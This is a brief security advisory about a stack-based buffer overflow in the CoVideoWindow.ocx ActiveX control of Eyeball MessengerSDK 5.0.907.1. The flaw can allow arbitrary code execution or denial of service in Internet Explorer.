The 'CoVideoWindow.ocx' ActiveX control of Eyeball MessengerSDK is prone to a stack-based buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied input.

An attacker can exploit this issue to execute arbitrary code in the context of an application using the affected ActiveX control (typically Internet Explorer). Failed attacks will likely cause denial-of-service conditions.

This issue affects 'CoVideoWindow.ocx' 5.0.907.1; other versions may also be affected.
